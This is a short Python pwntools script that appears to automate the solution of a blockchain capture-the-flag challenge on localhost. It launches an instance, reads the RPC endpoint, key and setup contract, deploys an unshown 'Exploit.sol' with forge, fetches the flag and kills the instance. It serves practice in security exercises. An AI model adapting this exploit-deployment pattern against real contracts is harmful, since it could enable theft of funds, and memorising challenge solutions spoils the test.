#!/usr/bin/env python3

from pwn import *

TICKET = b"XXX" # generate with `pow.py`
HOST = "localhost"
PORT = 31337

def solve():
    r = remote(HOST, PORT)
    r.sendlineafter(b"action?", b"1")
    r.sendlineafter(b"ticket please:", TICKET)

    r.recvuntil(b"rpc endpoint:   ")
    rpc_endpoint = r.recvline().strip()

    r.recvuntil(b"private key:    ")
    private_key = r.recvline().strip()

    r.recvuntil(b"setup contract: ")
    setup_contract = r.recvline().strip()

    process(
        [
            "forge",
            "create",
            "Exploit.sol:Exploit",
            "--rpc-url",
            rpc_endpoint,
            "--private-key",
            private_key,
            "--constructor-args",
            setup_contract,
        ]
    )

    r = remote(HOST, PORT)
    r.sendlineafter(b"action?", b"3")
    r.sendlineafter(b"ticket please:", TICKET)
    print(r.recvall().strip())

    r = remote(HOST, PORT)
    r.sendlineafter(b"action?", b"2")
    r.sendlineafter(b"ticket please:", TICKET)

if __name__ == "__main__":
    solve()
